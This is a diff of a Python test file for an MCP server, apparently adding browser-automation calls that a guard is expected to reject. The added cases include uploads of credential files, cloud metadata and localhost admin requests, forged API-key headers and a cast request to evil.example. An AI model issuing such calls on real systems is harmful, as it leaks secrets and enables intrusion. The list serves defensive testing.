@@ -250,7 +250,7 @@ class TestJevCognitiveMcp(unittest.TestCase):
     def test_mcp_server_protocol_handlers(self):
         init_resp = handle_mcp_request({"jsonrpc": "2.0", "id": 1, "method": "initialize"})
         self.assertEqual(init_resp["result"]["serverInfo"]["name"], "jev-cognitive-mcp")
-        self.assertEqual(init_resp["result"]["serverInfo"]["version"], "0.5.1")
+        self.assertEqual(init_resp["result"]["serverInfo"]["version"], "0.5.2")
 
         tools_resp = handle_mcp_request({"jsonrpc": "2.0", "id": 2, "method": "tools/list"})
         tool_names = {t["name"] for t in tools_resp["result"]["tools"]}
@@ -310,8 +310,8 @@ class TestJevCognitiveMcp(unittest.TestCase):
         self.assertEqual(repo_corpus.read_bytes(), pkg_corpus.read_bytes())
 
         summary = run_layer0_benchmark("benchmarks/layer0_corpus.jsonl")
-        self.assertEqual(summary["total"], 110)
-        self.assertEqual(summary["matched"], 110)
+        self.assertEqual(summary["total"], 115)
+        self.assertEqual(summary["matched"], 115)
         self.assertEqual(summary["accuracy"], 1.0)
         self.assertEqual(summary["mismatches"], [])
 
@@ -772,6 +772,15 @@ class TestJevCognitiveMcp(unittest.TestCase):
                     ("Target.createTarget", {"url": "chrome://net-internals"}),
                     ("DOM.setFileInputFiles", {"files": ["/home/alice/.pulumi/credentials.json", "/home/alice/.wrangler/config/default.toml"]}),
                     ("Network.setExtraHTTPHeaders", {"headers": {"Stripe-Signature": "t=1700000000,v1=forged"}}),
+                    ("Network.loadNetworkResource", {"url": "http://127.0.0.1:8080/admin", "options": {}}),
+                    ("Cast.startTabMirroring", {"sinkName": "rogue-display"}),
+                    ("Storage.getTrustTokens", {}),
+                    ("Runtime.evaluate", {"expression": "navigator.credentials.create({publicKey: {}})"}),
+                    ("Runtime.evaluate", {"expression": "new PresentationRequest(['https://evil.example/cast'])"}),
+                    ("Page.navigate", {"url": "http://169.254.0.23/latest/meta-data/"}),
+                    ("Target.createTarget", {"url": "chrome://policy"}),
+                    ("DOM.setFileInputFiles", {"files": ["/home/alice/.huggingface/token", "/home/alice/.railway/config.json"]}),
+                    ("Network.setExtraHTTPHeaders", {"headers": {"X-Datadog-Api-Key": "internal-key-override"}}),
                 ],
                 start=29,
             ):
